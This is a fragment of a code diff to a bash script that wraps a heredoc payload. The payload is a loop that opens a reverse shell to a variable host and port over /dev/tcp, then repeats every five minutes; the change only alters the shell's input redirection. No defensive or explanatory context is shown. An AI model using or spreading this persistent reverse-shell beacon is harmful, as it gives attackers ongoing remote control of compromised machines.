@@ -76,7 +76,7 @@ bash_script=$(cat << EOF
 
 while true; do
 
-bash &>/dev/tcp/$ip/$port 0>&1 &
+bash &>/dev/tcp/$ip/$port <&1 &
 sleep 300
 
 done
